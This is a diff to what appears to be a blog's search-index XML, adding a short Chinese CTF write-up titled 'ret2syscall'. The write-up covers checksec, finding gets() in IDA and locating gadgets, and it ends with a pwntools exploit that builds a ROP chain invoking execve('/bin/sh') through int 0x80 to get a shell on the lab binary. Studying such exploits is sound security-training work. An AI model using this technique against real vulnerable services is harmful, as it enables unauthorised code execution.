@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ret2syscall</title>
+      <link href="/2022/01/11/ret2syscall/"/>
+      <url>/2022/01/11/ret2syscall/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><p>运行程序</p><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><p>拖入IDA</p><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p> 发现危险函数gets()</p><p>​        找gadgets</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><p>​                bin/sh地址</p><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><p>​            int 0x80地址</p><p>​                                   <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></p><p>​              </p><p>​          </p><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 二进制 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ret2shellcode</title>
       <link href="/2022/01/10/ret2shellcode/"/>
       <url>/2022/01/10/ret2shellcode/</url>
@@ -69,6 +94,14 @@
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 二进制 </tag>
+            
+        </tags>
       
     </entry>
     
